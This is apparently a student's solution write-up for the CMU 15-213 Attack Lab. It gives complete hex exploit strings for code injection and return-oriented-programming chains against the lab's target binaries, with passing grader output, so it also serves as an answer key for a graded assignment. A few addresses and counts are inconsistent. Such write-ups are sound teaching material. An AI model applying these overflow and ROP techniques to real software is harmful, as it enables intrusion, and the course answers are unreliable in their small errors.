# Attack Lab: Understanding Buffer Overflow

In this lab, we will learn the different ways that attackers can exploit buffer overflow vulnerabilities to manipulate our program.

There are 5 phases in this lab. The first three phases are for the CTARGET program, where we will examing code injection attacks. The latter three phases are for the RTARGET program, where we will use return-oriented programming.

Both CTARGET and RTARGET read strings from standard input using a `getbuf` function, which is called in a `test` function. The `getbuf` function is defined as follows:

```c
unsigned getbuf(){
  char buf[BUFFER_SIZE];
  gets(buf);
  return 1;
}
```

The `getbuf` function does not check whether the input string fits into the provided buffer, so by manipulating the input string, we can overflow the buffer and alter the program.

We can execute the CTARGET and RTARGET programs by calling `./ctarget -q` or `./rtarget -q`, where the `-q` tag tells the program not to communiate with the grading server. We will get an error if we do not include this tag.

There is also a `hex2raw` program included in the lab, which converts two-digit hex values into attack strings. We use this program on our exploit string before passing the result to the targets. For example, if we store our exploit string in `ctarget.l2.txt`, then we can pass it to CTARGET using `./hex2raw < ctarget.l2.txt | ./ctarget -q`.

<br>

## CTARGET (Phases 1-3)

In these 3 phases, we will use the code-injection technique to manipulate our program.

<br>

## Phase 1: CTARGET Level 1

### Task:
- We will not inject new code. Rather, we will use the exploit string to redirect to an existing procedure.
- When `getbuf` returns, we want to pass control to the `touch1` function instead of back to `test`.

### What we need:
- Recall that when `test` calls `getbuf`, it pushes a return address onto the stack before allocating a stack frame for `getbuf`.
- We just need to alter this return address to the address of `touch1`, so that when `getbuf` returns, we will go to that address.

### What to do:
- Examining the disassembled instructions, we find that the size of the stack frame allocated for `getbuf` is `0x28`, which is 40 bytes. This means that the top of the stack, we have 40 bytes for `getbuf`, followed by the return address that we want to alter.
- Thus we can just fill in 40 bytes of random data, followed by the address of `touch1`. Examining the disassembled code, we find that the address of `touch1` is `0x4017c0`.

<br>

We can construct our exploit string:

```c
/* 40 bytes of data */
00 01 02 03 04 05 06 07 08 09
00 01 02 03 04 05 06 07 08 09
00 01 02 03 04 05 06 07 08 09
00 01 02 03 04 05 06 07 08 09
/* address of touch1, little-endian */
C0 17 40 00 00 00 00 00
```

<br>

Test:

```
$ ./hex2raw < ctarget.l1.exploit.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 C0 17 40 00 00 00 00 00
```

<br>

## Phase 2: CTARGET Level 2

### Task:
- We will now inject some code as a part of our exploit string.
- When `getbuf` returns, we want to pass control to the `touch2` function instead of returning to `test`.
- We also need to pass our cookie (included in the file `cookie.txt`) as an argument to `touch2`.

```c
/* Definition of touch2 */
void touch2(unsigned val){
  vlevel = 2;     // part of validation protocol
  if (val == cookie) {
    printf("Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  } else {
    printf("Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
  }
  exit(0);
}
```

### What we need:
- We need to set register `%rdi` to the cookie.
- We also need to add the address of `touch2` to the stack.

### What to do: First Method
- We could use a `mov` instruction to set register `%rdi` to the cookie.
- We could use a `push` instruction to push the address of `touch2` onto the stack.

We can construct our injected code:
```c
    movq     $0x59B997FA, %rdi            # move cookie to %rdi
    pushq    $0x4017EC                    # push address of touch2 onto stack
    ret
```

<br>

We need to know the byte representation of the above assembly code. We could achieve this with the following instructions:
```
gcc -c ctarget.l2.code.s            // creates ctarget.l2.code.o
objdump -d ctarget.l2.code.o        // disassemble it
```


The disassembled code is as follows:
```c
./ctarget.l2.code.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

<br>

We can now consider our stack structure:

<center>

|  Stack Structure      | Size     |
| --------------------- | -------- |
| address of `mov` (becomes address of `touch2` after push below) | This overwrites original return address |
| data                  | 27 bytes (this combined with the below 3 instructions fill up the 40-byte `getbuf` stack frame) |
| `ret`                 | 1 byte   |
| `push 0x4017EC`       | 5 bytes  |
| `mov 0x59b997fa,%rdi` | 7 bytes  |

</center>

<br>

Now we can put together our exploit string:

```c
/* mov $0x59b997fa,%rdi */
48 c7 c7 fa 97 b9 59
/* pushq $0x4017ec, address of touch2 */
68 ec 17 40 00
/* ret */
c3
/* 27 bytes of random filler */
01 02 03 04 05 06 07 08 09
01 02 03 04 05 06 07 08 09
01 02 03 04 05 06 07 08 09
/* address of mov, 0x5561dc78, little-endian */
78 DC 61 55 00 00 00 00
```

- *Note that the `mov` instruction is at the top of the 40-byte `getbuf` stack frame. Using `gdb`, we can find the address of this instruction, which is `0x0x5561dc78`.*

Test:

```
$ ./hex2raw < ctarget.l2.exploit.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 01 02 03 04 05 06 07 08 09 01 02 03 04 05 06 07 08 09 01 02 03 04 05 06 07 08 09 78 DC 61 55 00 00 00 00
```

<br>

### What to do: Second Method (causes SegFault but still valid..?)
- Instead of injecting code into the 40-byte stack frame, we could also inject the exploit code below the 40-byte stack frame.
- We could use a `mov` instruction to set `%rdi` to the cookie.
- We could move the stack pointer by altering `%rsp` so that when we return with `ret` we will have the right address.
- *Note that this solution will cause a segmentation fault in the validation part of the program, but will still print "Valid solution for level 2" first.*

Our injected code will be:
```c
    movq    $0x59B997FA, %rdi           # move cookie to %rdi
    addq    $12, %rsp                   # move stack pointer
    ret
```
- *The number 12 will be explained below by the stack structure.*

<br>

We can then get the byte representation of the code above:
```c
ctarget.l2.code.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	48 83 c4 0C          	add    $0xC,%rsp
   b:	c3                   	retq   
```

<br>

Our stack structure would be as follows:

<center>

|  Stack Structure      | Size     |
| --------------------- | -------- |
| address of `touch2`   |          |
| `mov $0x59b997fa,%rdi`| 7 bytes  |
| `add $0xC,%rsp`       | 4 bytes  |
| `ret`                 | 1 byte   |
| address of `mov` (overwrites original return address) | 8 bytes  |
| data                  | 40 bytes |

</center>

- *Why did we add 12 to the stack pointer? Note that after reaching the `mov` instruction, our stack pointer is pointing to `ret` (for we would have popped the address of `mov` from the stack). We want it to point to the address of `touch2`, which means we need to increment it by 7 + 4 + 1 bytes, which gives 12, or `0x0C`.*

<br>

Test:

```
$ ./hex2raw < ctarget.l2.exploit.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:FAIL:0xffffffff:ctarget:0:33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 A8 DC 61 55 00 00 00 00 48 C7 C7 FA 97 B9 59 48 83 C4 0C C3 EC 17 40 00 00 00 00 00
```

**This solution causes a SegFault in the validation code, but does print "Valid solution for level2."**

<br>

## Phase 3: CTARGET Level 3

### Task:
- When `getbuf` returns, we want to pass control to `touch3` instead of returning to `test`.
- We also want to pass a string representation of our cookie as argument for `touch3`.

### What we need:
- We need to store the cookie string onto the stack, and to store the address of the cookie string to `%rdi` to pass as argument to `touch3`.
- We also need to store the address of `touch3` onto the stack.

### What to do:
- Note that `hexmatch` will allocate a large stack frame for itself, so if we were to store the cookie string in the `getbuf` stack frame, it would get overwritten after the `getbuf` stack frame gets deallocated and the `hexmatch` stack frame gets allocated. Thus, we have to store the cookie string above the `getbuf` stack frame, inside the stack space for `test`.
- We will use a `mov` instruction to store the address of the cookie string to `%rdi`.
- We will use a `push` instruction to push the address of `touch3` onto the stack.

<br>

The code we want to inject:
```c
    movq    $0x5561dca8, %rdi       # address of cookie string
    pushq   $0x4018fa               # push address of touch3 onto stack
    ret
```
- *Note: To compute the address of the cookie string, we use `gdb` to find the value of stack pointer after the `getbuf` stack frame is deallocated. See stack structure below.*

<br>

We can get the byte representation of the above code:
```c
ctarget.l3.code.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   b:	68 fa 18 40 00       	pushq  $0x4018fa
  10:	c3                   	retq   
```

<br>

Our stack structure would be as follows:

<center>

|  Stack Structure      | Size     |
| --------------------- | -------- |
| cookie string         | 9 bytes (8 bytes + '\0'), in stack frame for `test`  |
| address of `mov` (or address of `touch3` after push below) | 8 bytes, this overwrites original return address  |
| data                  | 27 bytes (this, combined with the instructions below, fill up the 40-byte `getbuf` frame) |
| `ret`                 | 1 byte   |
| `push 0x4018fa`       | 5 bytes  |
| `mov 0x5561dc97,%rdi` | 7 bytes  |

</center>

<br>

Test:

```
$ ./hex2raw < ctarget.l3.exploit.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

## RTARGET (Phases 4 and 5)

For the RTARGET phases, it is much more difficult to perform code-injection attacks for two techniques are implemented to thwart such attacks:

- *Randomization*: stack positions differ from one run to another, so we cannot determine where the injected code will be located.
- *Nonexecutable marker*: the stack is marked as nonexecutable, so even if we could locate our injected code, we would just get a segmentation fault.

In this case, we could use **return-oriented programming (ROP)**.

<br>

### Return-Oriented Programming (ROP)

In return-oriented programming, we identify byte sequences within the existing program that consist of one or more instructions followed by the instruction `ret`. Such a segment is referred to as a **gadget**. What we need to do is to place the addresses of these gadgets onto the stack, so that when one `ret` instruction is hit, we move on to the next gadget. In this way, we can combine various gadget into a program that would perform what we want.

In the two phases below, we can make use of the *gadget farm*--the section of code that starts with `start_farm` and ends with `end_farm`.

<br>

## Phase 4: RTARGET Level 2

### Task (same as level 2 for CTARGET):
- When `getbuf` returns, pass control to `touch2`.
- Also pass my `cookie` as argument.

### What we need:
- Move `cookie` into `%rdi`.
- Add the address of `touch2` onto stack, so that when we return we can go to `touch2`.

### What to do:
- First, note that because the `cookie` does not show up anywhere in the gadget farm, we cannot use a `mov` instruction directly. Thus, we have to input the `cookie` as a part of our input string to `getbuf`, and then `pop` it from the stack into `%rdi`.
- What we need for `popq %rdi` is the instruction code `5f`, which is unfortunately not in the gadget farm. **So we could pop the cookie into another register and the use a `mov` instruction to move it to `%rdi`.**
- Examining the farm, we find a `58 90 c3` sequence at address `0x4019ab`.
  - `58` encodes `popq %rax`.
  - `90` encodes the `nop` instruction, whose only effect is to increment the program counter.
  - `c3` encodes the `ret` instruction.
- We also find a `48 89 c7 c3` sequence at address `0x4019a2`.
  - `48 89 c7` encodes `movq %rax, %rdi`.
  - `c3` encodes the `ret` instruction.

<br>

Having found these, we can now think about our stack structure:

<center>

|  Stack Structure    |
| ------------------- |
| address of `touch2` |
| address of `mov`    |
| `cookie`            |
| address of `pop`    |
| 40 bytes of data    |

</center>

<br>

We can then construct our input string:

```c
/* 40 bytes of data */
01 02 03 04 05 06 07 08 09 00
01 02 03 04 05 06 07 08 09 00
01 02 03 04 05 06 07 08 09 00
01 02 03 04 05 06 07 08 09 00
/* address of pop, little-endian */
AB 19 40 00 00 00 00 00
/* cookie, little-endian, fill up to 8 bytes */
FA 97 B9 59 00 00 00 00
/* address of mov, little-endian */
A2 19 40 00 00 00 00 00
/* address of touch2, little-endian */
EC 17 40 00 00 00 00 00
```

Testing:
```
$ ./hex2raw < rtarget.l2.exploit.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

<br>

## Phase 5: RTARGET Level 3

### Task:
- When `getbuf` returns, pass control to `touch3`.
- Also pass a pointer to a string representation of my `cookie` as the argument.

### What we need:
- String representation of `cookie` on the stack.
- Move address of `cookie` to `%rdi`.
- Add address of `touch3` onto the stack.

### What to do:
- First, we've seen in phase 3 of CTARGET that `touch3` will allocate a large stack frame, which means we cannot put the cookie in the `getbuf` stack frame but instead have to put it in the `test` stack frame, above the `touch3` address.

- Because the stack addresses are randomized, we cannot determine the address of the `cookie` string on the stack. But what we could do is to use `%rsp` as a basis for calculating addresses. In this way, we can store `cookie` string at some `%rsp + bias` location and will be able to calculate its address using `%rsp`.

- In order to calculate `%rsp + bias`, we need some sort of addition. Addition is not directly provided in the gadget farm, but we could use the `lea` instructions to perform addition between registers. Examining the gadget farm, we find many `lea` instructions, but all but one of them involve large constants. As there is no way for us to use these large constants, we eliminate them and end up with one instruction:
```c
4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
4019da:	c3                   	retq
```
  - This instruction gives `%rax = %rdi + %rsi`. So we could **move `%rsp` and `bias` into `%rdi` and `%rsi`.**

Moving `%rsp` into `%rdi`:

- There is no instruction sequences in the gadget farm that could encode either `movq %rsp, %rdi` or `movq %rsp, %rsi`. We thus need to bring in some other registers. 
- Examining all the possible `movq %rsp, Dest` instruction codes, **we find `48 89 e0 c3` at location `0x401a06`, which moves `%rsp` to `%rax`.**
  - `48 89 e0` encodes `movq %rsp, %rax`.
  - `c3` encodes `ret`.
- **We also find `48 89 c7 c3` at location `0x4019a2`, which moves `%rax` to `%rdi`.** With this instruction and the above one, we can move `%rsp` to `%rdi`.
  - `48 89 c7` encodes `movq %rax, %rdi`.
  - `c3` encodes `ret`.

Moving bias into `%rsi`:

- We still need to move `bias` to `%rsi`. Without knowing what needs to go on the stack, we cannot determine our bias yet, but we could for now assume that we will input it as a part of the input string for `getbuf`.
- After adding the bias onto the stack, we would have to `pop` it into a register. The easiest way is to use `popq %rsi`, but of course that is not directly available in out gadget farm.
- Examining the gadget farm, we find that the only possible `pop` instruction followed by `ret` is **`58 90 c3` at location `0x4019ab`, which pops from stack to `%rax`.**
  - `58` encodes `popq %rax`.
  - `90` encodes `nop`.
  - `c3` encodes `ret`.
- Now we need to move `%rax` to `%rsi`. We find that the only `movq %rax, Dest` instruction that exists in the gadget farm is `48 89 c7 c3` at location `0x4019a2`, which moves `%rax` to `%rdi`. However, `%rdi` is currently in use, so we should not alter it. *This therefore does not work.*
- Based on the hint given in the attacklab doc, we may have to use `movl` instead of `movq`. Indeed, **we find `89 c2 90 c3` at location `0x4019dd`, which moves `%eax` to `%edx`.**
  - `89 c2` encodes `movl %eax, %edx`.
  - `90` encodes `nop`.
  - `c3` encodes `ret`.
- Now we need to somehow move `%edx` to `%esi`. However, the only `movl %edx, Dest` instruction we have in the gadget farm is **`89 d1 38 c9 c3` at location `0x401a34`, which moves `%edx` to `%ecx`.**
  - `89 d1` encodes `movl %edx, %ecx`.
  - `38 c9` encodes the functional nop instruction of `cmpb %cl, %cl`, which modifies nothing.
  - `c3` encodes `ret`.
- Now we need to move `%ecx` to `%esi`. **We find `89 ce 90 90 c3` at location `0x401a13`, which moves `%ecx` to `%esi`.**
  - `89 ce` encodes `movl %ecx, %esi`.
  - `90` encodes `nop`.
  - `c3` encodes `ret`.
  - *Recall that when we move a 4-byte value into an 8-byte register, the high 4 bytes become cleared to 0. So even though we've only moved the bias into `esi`, the 8-byte value of `rsi` is just the value of the bias.*

<br>

- Now we have `%rsp` (note that this is the value of stack pointer at the time when the `movq %rsp, %rax` instruction is executed) in `%rdi` and the bias in `rsi`, **we can use the `48 8d 04 37 c3` instructions at location `0x4019d6` to compute the value of `%rsp + bias` and store at `%rax`.**
  - `48 8d 04 37` encodes `lea (%rdi,%rsi,1),%rax`.
  - `c3` encodes `ret`.

- In order to pass the pointer to the `cookie` string as an argument to `touch3`, we need to move the address of `cookie` to `%rdi`. This requires moving `%rax`, which currently stores `%rsp + bias`, to `%rdi`. We find a **`48 89 c7 c3` sequence at address `0x4019a2`, which moves `%rax` to `%rdi`.**
  - `48 89 c7` encodes `movq %rax, %rdi`.
  - `c3` encodes the `ret` instruction.

- Now we can call `touch3`. Recall that we need to store the `cookie` string above the `touch3` address, or else the string will get overwritten when the `touch3` stack frame gets allocated.

<br>

We can now examine the structure of the stack:

<center>

|  Stack Structure                    | Address  |
| ----------------------------------- | -------- |
| `cookie` string                     |          |
| address of `touch3`                 | 0x4018fa |
| address of `movq %rax, %rdi`        | 0x4019a2 |
| address of `lea (%rdi,%rsi,1),%rax` | 0x4019d6 |
| address of `movl %ecx, %esi`        | 0x401a13 |
| address of `movl %edx, %ecx`        | 0x401a34 |
| address of `movl %eax, %edx`        | 0x4019dd |
| bias                                |          |
| address of `popq %rax`              | 0x4019ab |
| address of `movq %rax, %rdi`        | 0x4019a2 |
| address of `movq %rsp, %rax`        | 0x401a06 |
| 40 bytes of data                    |          |

</center>

<br>

We can also calculate the bias:
- Note that when we run `movq %rsp, %rax`, the stack pointer is pointing to the address of `movq %rax, %rdi` instruction.
- Thus, the `cookie` string is 8 8-byte addresses plus a 8-byte bias away from the stack pointer. (Note that even though when we move the bias to `%edx`, we are only moving 4 bytes, we still need the bias input to be 8 bytes because we are using `popq %rax` which pops 8 bytes from the stack.)
- The bias is thus 72 bytes, which is `0x48` bytes.

<br>

We can then construct our input string:

```c
/* 40 bytes of data */
01 02 03 04 05 06 07 08 09 00
01 02 03 04 05 06 07 08 09 00
01 02 03 04 05 06 07 08 09 00
01 02 03 04 05 06 07 08 09 00
/* address of movq %rsp, %rax */
06 1A 40 00 00 00 00 00
/* address of movq %rax, %rdi */
A2 19 40 00 00 00 00 00
/* address of popq %rax */
AB 19 40 00 00 00 00 00
/* bias, fill up to 8 bytes, little-endian */
48 00 00 00 00 00 00 00
/* address of movl %eax, %edx */
DD 19 40 00 00 00 00 00
/* address of movl %edx, %ecx */
34 1A 40 00 00 00 00 00
/* address of movl %ecx,%esi */
13 1A 40 00 00 00 00 00
/* address of lea (%rdi,%rsi,1),%rax */
D6 19 40 00 00 00 00 00
/* address of movq %rax, %rdi */
A2 19 40 00 00 00 00 00
/* address of touch3 */
FA 18 40 00 00 00 00 00
/* cookie string */
35 39 62 39 39 37 66 61 00
```

Testing:

```
$ ./hex2raw < rtarget.l3.exploit.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```